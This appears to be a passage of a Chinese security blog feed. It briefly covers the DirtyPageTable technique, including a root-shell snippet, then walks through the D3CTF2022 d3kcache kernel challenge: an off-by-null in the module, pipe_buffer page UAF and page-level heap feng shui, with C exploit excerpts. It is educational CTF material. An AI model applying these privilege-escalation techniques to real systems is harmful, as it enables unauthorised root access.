    <content type="html"><![CDATA[<p>Original blog:<a href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty_Pagetable (yanglingxi1993.github.io)</a></p><p>做一些记录</p><h1 id="How-DirtyPageTable-Works"><a href="#How-DirtyPageTable-Works" class="headerlink" title="How DirtyPageTable Works"></a>How DirtyPageTable Works</h1><p>先简单过一遍DirtyPageTable的流程,以最常见的UAF为例</p><ol><li><p>获得一个UAF obj,将其释放回到slab中,并将slab中所有其他的obj全部释放,这样该slab就变成了空slab,</p><p>从而回到伙伴系统中</p></li><li><p>大量分配用户页表,使得用户页表占用victim slab</p></li><li><p>构造用于操作页表条目 (PTE) 的原语</p></li><li><p>修改PTE,使得将该PTE的物理内存变为内核代码/数据的物理内存,例如我们可以修改setresuid(),setresgid()等函数对是否具有调用权限的判别</p></li><li><p>getroot</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure></li></ol><p>这就是整个DiryPageTable的工作流程了,原理并不复杂,和USMA非常相似</p><p>需要解决的问题有两个:</p><ol><li>如何得到UAF,并且获得操作页表条目的能力</li><li>如何得到目标地址的物理内存地址</li></ol><p>利用手法提出者给了我们三种示范</p><h1 id="DPT-with-CVE-2023-21400"><a href="#DPT-with-CVE-2023-21400" class="headerlink" title="DPT with CVE-2023-21400"></a>DPT with CVE-2023-21400</h1>]]></content>
    
    
    <summary type="html">magic</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="dirtypagetable" scheme="https://ixout.github.io/tags/dirtypagetable/"/>
    
  </entry>
  
  <entry>
    <title>从d3cache看页级堆风水与一个off-by-null导致的任意读写</title>
    <link href="https://ixout.github.io/posts/10326/"/>
    <id>https://ixout.github.io/posts/10326/</id>
    <published>2024-03-24T13:37:46.000Z</published>
    <updated>2025-01-07T13:22:54.504Z</updated>
    
    <content type="html"><![CDATA[<h1 id="D3CTF2022-d3kcache"><a href="#D3CTF2022-d3kcache" class="headerlink" title="D3CTF2022-d3kcache"></a>D3CTF2022-d3kcache</h1><p>这题原本是记录在kernel习题记录的,但是深入理解arttnba3师傅的博客后,发现这题蕴含的知识太丰富了</p><p>于是打算单独开一篇文章,好好赏析一番</p><p>另外,arttnba3师傅tql!!!orz</p><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><p>常规保护kaslr,kpti,smap,smep等等都是拉满的</p><p>除此之外在config中还可以看到开启了<code>CONFIG_CFI_CLANG</code>保护</p><p>google可以得知一下信息</p><blockquote><p>This option enables Clang’s forward-edge Control Flow Integrity (CFI) checking, where the compiler injects a runtime check to each indirect function call to ensure the target is a valid function with the correct static type. This restricts possible call targets and makes it more difficult for an attacker to exploit bugs that allow the modification of stored function pointers. More information can be found from Clang’s documentation:</p><p><a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">https://clang.llvm.org/docs/ControlFlowIntegrity.html</a></p></blockquote><p>即选中了该选项的内核编译时,会在间接函数跳转处加入更多的检查,确保间接函数指针不被劫持</p><p>说简单点就是在发生call调用后,会在跳转目标头部做一些检查</p><p>这样一来,函数指针表将会受到严格保护,像修改函数指针虚表这样的流劫持,就很难利用了,因为不能劫持函数指针为gadget!!</p><h2 id="模块分析"><a href="#模块分析" class="headerlink" title="模块分析"></a>模块分析</h2><p>模块创建了一个obj为2048大小的slab分配器</p><p>并通过ioctl实现了常规的note增加,删除,追加和展示等功能</p><p>唯一关键的点在于追加过程中会导致一个<code>off-by-null</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">1300</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( idx &lt;= <span class="number">0xF</span>uLL &amp;&amp; kcache_list[idx].ptr )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = input_size;</span><br><span class="line">          <span class="keyword">if</span> ( input_size &gt; <span class="number">0x800</span> || input_size + kcache_list[idx].size &gt;= <span class="number">0x800</span> )</span><br><span class="line">            v7 = <span class="number">2048</span> - kcache_list[idx].size;</span><br><span class="line">          <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          v8 = (<span class="type">char</span> *)kcache_list[idx].ptr + (<span class="type">unsigned</span> <span class="type">int</span>)kcache_list[idx].size;<span class="comment">// append</span></span><br><span class="line">          v9 = (<span class="type">unsigned</span> <span class="type">int</span>)v7;</span><br><span class="line">          v10 = input_ptr;</span><br><span class="line">          _check_object_size(v8, (<span class="type">unsigned</span> <span class="type">int</span>)v7, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !copy_from_user(v8, v10, v9) )</span><br><span class="line">          &#123;</span><br><span class="line">            v8[v9] = <span class="number">0</span>;<span class="comment">//off-by-null</span></span><br><span class="line">            v5 = <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        v25 = &amp;unk_837;</span><br><span class="line">LABEL_46:</span><br><span class="line">        printk(v25);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>在内核中仅有一个<code>off-by-null</code>漏洞似乎难以利用</p><p>不过当我们遍历那些内核pwn中常利用的结构体之后,我们可以发现<code>pipe_buffer</code>是一个十分适合的对象</p><p>其既可以读也可以写,而读写目标完全由其<code>page</code>成员决定,并且<code>page</code>成员就在结构体的起始处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们知道<code>struct page</code>对应着唯一一个物理页,每个<code>struct page</code>的大小是0x40</p><p>那么如果我们的<code>off-by-null</code>漏洞刚好作用在pipe_buffer的<code>page</code>字段,岂不是就会使得两个pipe_buffer的page字段指向同一个<code>struct page</code>进而操作在同一个物理页上</p><p>不过考虑到page字段的最低处本身就有<code>1/4</code>的概率是<code>\x00</code>,所以只有<code>3/4</code>的概率能够成功劫持</p><p>我们暂且不考虑做到这一步的细节,继续向下思考</p><p>现在我们有了两个能够操控相同物理页的pipe,很自然的一个思路便是UAF泄露信息然后劫持结构体函数指针</p><p>但别忘了内核开启了CFI,也就是说这种方法并不适用,那在这种情况下要想提权就必须要具备一定程度的读写能力</p><p><code>arttnba3</code>大佬给出了一个十分巧妙的办法,即释放其中一个pipe,让这个uaf的页继续作为<code>pipe_buffer</code>的slab页</p><p>此时我们可以用另一个pipe读出uaf页内部的信息,这其中就包含着完整的page指针,如果我们再拿这个page指针去覆盖uaf页上下一个<code>pipe_buffer</code>结构体,岂不是又构造了一次uaf</p><p>接着我们再释放这两个pipe中的一个,并再次将该页作为<code>pipe_buffer</code>的slab页</p><p>与上一次uaf不同的是,这一次uaf我们是知道这个uaf页的<code>struct page*</code>指针的,那么我们岂不是可以直接修改这个uaf页上的pipe_buffer的page指针为本uaf页的page指针</p><p>从而使得这一次uaf页上的pipe_buffer指向自身</p><p>之后多修改几个这样的指针让其互相重置岂不是可以任意读写,再提权不是十分简单</p><h2 id="思路实现"><a href="#思路实现" class="headerlink" title="思路实现"></a>思路实现</h2><p>以上理了一遍思路,现在开始分析如何实现</p><h3 id="页级堆风水构造"><a href="#页级堆风水构造" class="headerlink" title="页级堆风水构造"></a>页级堆风水构造</h3><p>此前已经学习过利用setsockopt来构造堆风水</p><p>此处不再赘述</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~ $ <span class="built_in">cat</span> /proc/buddyinfo </span><br><span class="line">Node 0, zone      DMA      0      0      0      0      0      1      1      1      0      1     </span><br><span class="line">Node 0, zone    DMA32      1      2      1      2      4      1      2      2      6      2    </span><br></pre></td></tr></table></figure><p>我们可以看到,内核刚启动时伙伴系统算是比较干净的</p><p>低阶的连续页较少,次数不多的setsockopt便能够清空低阶的连续页</p><p>也就是对应exp中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* spray pages in different size for various usages */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_pages</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * We want a more clear and continuous memory there, which require us to </span></span><br><span class="line"><span class="comment">     * make the noise less in allocating order-3 pages.</span></span><br><span class="line"><span class="comment">     * So we pre-allocate the pages for those noisy objects there.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray 8 pages for page-level heap fengshui */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_4pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使得之后分配的页都是高阶拆分下来的连续页,之所以后面还要隔几个释放一个,是因为socket产生的噪声,为了尽量避免其拆散高阶连续页,所以释放之前申请的给其使用</p><p>现在面临的一个问题是</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;li&gt;</span></span><br><span class="line">kcache_jar            16     16   2048   16    8 : tunables    0    0    0 : slabdata      1   0</span><br><span class="line">kmalloc-cg-1k         94    160   1024   16    4 : tunables    0    0    0 : slabdata     10   0</span><br><span class="line">dma-kmalloc-4k         0      0   4096    8    8 : tunables    0    0    0 : slabdata      0   0</span><br></pre></td></tr></table></figure><p>页级堆风水要保证成功率,最好是向同一个order申请</p><p><code>kcache_jar</code>所在的分配器每一次申请slab都是申请8页也就是order3</p><p>而<code>pipe_buffer</code>默认创建16个大小是<code>640</code>是向<code>kmalloc-cg-1k</code>申请,并在耗尽时向order2申请</p><p>但要想保证较高的成功率,我们需要想办法使得二者是向同阶的order申请,<code>kcache_jar</code>显然没法改</p><p>但<code>pipe_buffer</code>并不是改不了</p><p>fcntl提供了接口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">pipe_fcntl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">    pipe = get_pipe_info(file, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">    __pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> F_SETPIPE_SZ:</span><br><span class="line">        ret = pipe_set_size(pipe, arg);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_set_size</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    ret = pipe_resize_ring(pipe, nr_slots);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe_resize_ring</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">int</span> nr_slots)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> head, tail, mask, n;</span><br><span class="line"></span><br><span class="line">    bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">               GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br></pre></td></tr></table></figure><p>我们可以通过这个改变pipe_buffer申请obj的slab</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">extend_pipe_buffer_to_4k</span><span class="params">(<span class="type">int</span> start_idx, <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nr; i++) &#123;</span><br><span class="line">        <span class="comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_8pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[start_idx + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, start_idx + i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除此之外我们再选择将kcache_jar的slab夹在pipe_buffer的slab中间,以此来提高成功率</p><p>对应exp代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i ++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to create pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray pipe_buffer on order-2 pages, make vul-obj slub around with that.*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extend_pipe_buffer_to_4k(<span class="number">0</span>, PIPE_SPRAY_NUM / <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);</span><br><span class="line">    free_page(pgv_8pages_start_idx++);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_alloc(i, <span class="number">8</span>, <span class="string">&quot;arttnba3&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extend_pipe_buffer_to_4k(PIPE_SPRAY_NUM / <span class="number">2</span>, PIPE_SPRAY_NUM / <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    .......</span><br><span class="line">    .......</span><br><span class="line">            <span class="comment">/* try to trigger cross-cache overflow */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_append(i, KCACHE_SIZE - <span class="number">8</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line">    .......</span><br><span class="line">    .......</span><br></pre></td></tr></table></figure><p>至此<code>off-by-null</code>利用完成</p><h3 id="第一次uaf"><a href="#第一次uaf" class="headerlink" title="第一次uaf"></a>第一次uaf</h3><p>在上一步我们完成了<code>off-by-null</code>的利用</p><p>如果一切顺利,那么我们现在已经掌握了一个可以uaf的页</p><p>如何检测是否成功拿到了这个页呢</p><p>首先我们在触发<code>off-by-null</code>之前先向所有管道写入一些标识信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] allocating pipe pages...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);  <span class="comment">/* prevent pipe_release() */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么当<code>off-by-null</code>触发之后,如果我们再次遍历读取所有管道,如果一个管道发现其读取出的整型nr与当前游标i不同,那么我们就可以确认这个管道的pipe_buffer就是被<code>off-by-null</code>的那个</p><p>即<code>pipe[nr]</code>是被<code>off-by-null</code>的那个,<code>pipe[i]</code>是与其重叠那个原管道</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* checking for cross-cache overflow */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] checking for corruption...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">    <span class="type">char</span> a3_str[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(a3_str, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(a3_str));</span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], a3_str, <span class="number">8</span>);</span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(a3_str, <span class="string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">        orig_pid = nr;</span><br><span class="line">        victim_pid = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, </span><br><span class="line">               victim_pid, orig_pid);</span><br><span class="line">        <span 